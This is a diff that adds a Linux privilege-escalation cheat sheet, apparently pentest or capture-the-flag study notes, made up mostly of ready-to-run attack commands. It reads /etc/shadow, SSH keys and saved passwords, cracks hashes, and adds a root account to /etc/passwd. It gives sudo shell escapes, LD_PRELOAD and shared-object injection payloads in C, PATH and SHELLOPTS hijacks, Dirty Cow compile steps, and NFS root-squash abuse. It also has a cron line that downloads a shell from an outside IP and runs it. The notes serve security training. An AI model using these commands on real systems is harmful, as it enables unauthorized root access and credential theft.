@@ -1,0 +1,177 @@
+** System info
+uname -a
+lsb_release -r
+cat /proc/version
+env
+whoami
+history
+who, w, las (who is logged in)
+sudo -l, cat /etc/sudoers (are you in sudoers list)
+etc/passwd (check super userswith 0 in 3rd column)
+
+** Network info
+ifconfig -a
+netstat -antup (see internal external ports/services)
+lsof -i
+ss -tulpn
+
+** Kernel
+searchsploit kernel 2.6 linux|sort -n
+CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
+	https://www.exploit-db.com/exploits/15285/
+Linux Kernel <= 2.6.37 'Full-Nelson.c'
+	https://www.exploit-db.com/exploits/15704/
+CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
+	https://git.zx2c4.com/CVE-2012-0056/about/
+Linux CVE 2012-0056
+	wget -O exploit.c <http://www.exploit-db.com/download/18411>
+	  gcc -o mempodipper exploit.c
+	  ./mempodipper
+CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
+	https://dirtycow.ninja/
+	Compile dirty cow:
+	 g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
+	Cross compiling exploits: gcc -m32 -o output32 hello.c #(32 bit) gcc -m64 -o output hello.c # (64 bit)
+Linux 2.6.32
+	https://www.exploit-db.com/exploits/15285/
+
+** Services
+ps aux (list service running, look for priv users)
+ps -ef
+dpkg -l
+rpm -qa (redhat systems)
+
+** Find files
+find / -perm -u=s -type f 2>/dev/null
+ls -la ~/.ssh/
+find . -type f -maxdepth 4 | xargs grep -i "password"
+grep -iRl "password" ./
+Find folder name: find / -type d -name <name> -print 2>/dev/null
+
+LinuxPrivChecker.py
+Unix-privesc-check
+./lse.sh -l2 (linux smart enum, -l2 run most test)
+LinEnum, linpeas.sh
+/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
+
+gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w (race condition vuln, try multiple times)
+./c0w
+
+cat /etc/openvpn/auth.txt
+cat ~/.bash_history | grep -i passw
+
+** Weak file permissions
+cat /etc/passwd
+cat /etc/shadow
+unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
+hashcat -m 1800 unshadowed.txt rockyou.txt -O
+Remove x in root row of passwd for no password
+	Or: echo "root2:7O7zbkVaDIjHU:0:0:root:/root:/bin/bash" >> /etc/passwd (add new user, has using openssl, passwd=evil)
+find /etc -type f -writable 2> /dev/null (find writeable files in /etc)
+
+** SSH Keys search
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+chmod 400 id_rsa
+ssh -i id_rsa root@<ip>
+
+** Sudo (Shell escaping)
+sudo -l (show programs that can run sudo)
+sudo find /bin -name nano -exec /bin/sh \;
+sudo awk 'BEGIN {system("/bin/sh")}'
+echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+sudo vim -c '!sh'
+Restricted shell (like rbash): https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
+
+** Abusing Intended Functionality
+sudo -l (show programs that can run sudo)
+sudo apache2 -f /etc/shadow (copy root hash)
+echo '[Pasted Root Hash]' > hash.txt
+john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
+
+** Sudo (LD_PRELOAD) (or LD_LIBRARY_PATH, different exploit required)
+sudo -l (notice that the LD_PRELOAD environment variable is intact)
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
+sudo LD_PRELOAD=/tmp/x.so apache2
+
+** SUID (Shared Object Injection) 
+find / -type f -perm -04000 -ls 2>/dev/null (show SUID binaries)
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file" (notice that a .so file is missing from a writable directory)
+mkdir /home/user/.config
+#include <stdio.h>
+#include <stdlib.h>
+static void inject() __attribute__((constructor));
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+/usr/local/bin/suid-so
+
+** SUID (env variables - PATH)
+1:
+find / -type f -perm -04000 -ls 2>/dev/null (suid-env is an example)
+strings /usr/local/bin/suid-env
+echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+export PATH=/tmp:$PATH
+/usr/local/bin/suid-env
+2:
+find / -type f -perm -04000 -ls 2>/dev/null (suid-env2 is an example)
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; } (check /bin/sh --version, only works <4.2-048)
+export -f /usr/sbin/service
+/usr/local/bin/suid-env2
+3:
+env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
+
+** Capabilities
+getcap -r / 2>/dev/null (see "cap_setuid")
+/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+
+** Cron (Path)
+cat /etc/crontab 
+crontab -l
+./pspy64 (see cron commands running in real time)
+ls -la /etc/cron*
+(check PATH locations, check wildcards(*), overwiteable files in cron job)
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+/tmp/bash -p
+Create cron: echo '* * * * * root /bin/bash -c "/usr/bin/wget http://192.168.83.219/shell -O /tmp/shell && chmod 777 /tmp/shell && /tmp/shell"' > /tmp/x/snaps/gcron_enabled
+
+** NFS Root Squashing
+cat /etc/exports (see “no_root_squash” option is defined for the “/tmp” export)
+
+showmount -e VICTIM_IP (use rpcinfo -p on victim to see nfs port and might need ssh forward -L from attack machine)
+mkdir /tmp/1
+mount -o rw,vers=2 VICTIM_IP:/ /tmp/1 (mount victim machine and add malicious binary)
+	on attack machine: sudo cp /bin/bash bash, then add suid then on victim run bash for root
+or: echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
+gcc /tmp/1/x.c -o /tmp/1/x
+chmod +s /tmp/1/x
+/tmp/x (run on victim machine, file will have suid)
+
+** Check mounted file systems
+mount
+df -h
+fdisk -l
+cat /etc/fstab
+cat /etc/mtab
+
+** Tips
+Replace line in config file with sed: sed -i 's:<line content to change>:<new line content to replace>:g' <path to file>
+Ping: ping -c 1 $IP 2>&1 (then on receiving machine) tcpdump -i tun0 icmp
+Run 'strings' commands on memory dumps to view text (e.g. string core.493)
+Use strace to analyse binary, or ltrace to see libraries
+
+
+
